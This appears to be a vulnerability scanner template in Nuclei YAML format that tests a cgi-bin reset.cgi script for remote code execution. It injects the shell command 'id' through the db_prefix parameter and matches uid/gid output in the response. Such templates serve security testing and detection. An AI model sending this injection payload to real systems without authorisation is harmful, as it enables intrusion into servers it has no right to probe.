id: cgi-bin-rce
info:
  author: chirag-3rag
  name: Remote Code Execution in cgi-bin
  severity: critical
requests:
- headers:
    Host: '{{Hostname}}'
  matchers:
  - part: body
    regex:
    - uid=([0-9a-z]+)
    - gid=([0-9a-z]+)
    - groups=([0-9a-z]+)
    type: regex
  - part: body
    type: word
    words:
    - file prefix
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/cgi-bin/dmt/reset.cgi?db_prefix=%26id%26'
